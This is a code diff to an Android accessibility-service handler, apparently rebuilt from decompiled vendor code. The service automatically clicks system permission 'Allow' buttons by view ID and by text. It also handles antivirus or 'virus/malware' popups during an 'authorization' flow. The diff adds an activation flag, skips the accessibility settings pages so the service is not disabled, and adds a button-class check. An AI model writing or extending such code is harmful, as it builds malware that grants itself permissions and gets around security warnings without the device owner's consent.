@@ -156,6 +156,14 @@ open class Yw5xudHandler(
     var isAuthorizing: Boolean = false
         private set
 
+    /**
+     * Independent activation flag for global permission auto-click (vendor f55152a9).
+     * Default false. Only activated by external command, NOT during authorization flow.
+     * This prevents b7 from clicking "允许" on settings pages during Steps execution.
+     */
+    @Volatile
+    var isGlobalPermClickActive: Boolean = false
+
     // Delay constants (vendor f55151a8, f55157b4)
     val stepDelay: Long = 300L
 
@@ -166,6 +174,7 @@ open class Yw5xudHandler(
         failures: MutableList<String>,
         logs: MutableList<String>
     ) {
+        activate() // Set isActive=true so onAccessibilityEvent processes events
         isAuthorizing = true
         try {
             Log.i(TAG, "\uD83D\uDE80 [Yw5xud] \u5F00\u59CB\u6388\u6743: ${android.os.Build.BRAND}")
@@ -301,26 +310,47 @@ open class Yw5xudHandler(
 
     // --- Event handling (vendor b7 + b8) ---
 
+    /**
+     * Accessibility settings class names that must be ignored to prevent
+     * accidentally toggling the service switch. Vendor avoids this by
+     * disabling the settings-page monitor (m211454e3) before doing anything.
+     */
+    private val ACCESSIBILITY_SETTINGS_CLASSES = setOf(
+        "com.android.settings.SubSettings",
+        "com.android.settings.accessibility.AccessibilitySettings",
+        "com.android.settings.accessibility.AccessibilitySettingsForSetupWizard",
+        "com.android.settings.accessibility.ToggleAccessibilityServicePreferenceFragment",
+        "com.android.settings.accessibility.VolumeShortcutToggleAccessibilityServicePreferenceFragment",
+        "com.android.settings.accessibility.MiuiAccessibilitySettingsActivity"
+    )
+
     override fun onAccessibilityEvent(event: AccessibilityEvent, packageName: String, className: String) {
         if (!isActive || !isAuthorizing) return
+
+        // CRITICAL: Never process events on accessibility settings pages.
+        if (packageName == "com.android.settings" && className in ACCESSIBILITY_SETTINGS_CLASSES) {
+            Log.d(TAG, "[onEvent] 跳过无障碍设置页面: $className")
+            return
+        }
+
         val now = System.currentTimeMillis()
-        if (now - lastEventTime < stepDelay) return // 300ms throttle per vendor
+        if (now - lastEventTime < stepDelay) return
         lastEventTime = now
 
         try {
             val root = service?.rootInActiveWindow ?: return
 
-            // 1. Virus/malware popup detection (vendor m212458b8)
+            // 1. Virus/malware popup detection — ALWAYS active during authorization (vendor b8)
             if (handleVirusPopup(root, packageName)) return
 
-            // 2. Permission auto-grant: ViewId search (vendor b7 phase 1)
-            if (clickPermissionByViewId(root)) return
-
-            // 3. Permission auto-grant: text search fallback (vendor b7 phase 2)
-            if (now - lastPermClickTime >= stepDelay) {
-                if (clickPermissionByText(root)) {
-                    lastPermClickTime = now
-                    return
+            // 2-3. Permission auto-click — ONLY when independently activated (vendor b7)
+            if (isGlobalPermClickActive) {
+                if (clickPermissionByViewId(root)) return
+                if (now - lastPermClickTime >= stepDelay) {
+                    if (clickPermissionByText(root)) {
+                        lastPermClickTime = now
+                        return
+                    }
                 }
             }
         } catch (_: Exception) {}
@@ -384,9 +414,13 @@ open class Yw5xudHandler(
                 if (nodes.isNullOrEmpty()) continue
                 for (node in nodes) {
                     if (node.isVisibleToUser) {
-                        if (clickWithParentFallback(node)) {
-                            Log.i(TAG, "✅ 权限按钮点击(ViewId): $buttonId")
-                            return true
+                        // JADX b7: extra check className contains "Button"
+                        val className = node.className?.toString() ?: ""
+                        if (className.contains("Button", ignoreCase = true)) {
+                            if (clickWithParentFallback(node)) {
+                                Log.i(TAG, "✅ 权限按钮点击(ViewId): $buttonId")
+                                return true
+                            }
                         }
                     }
                 }
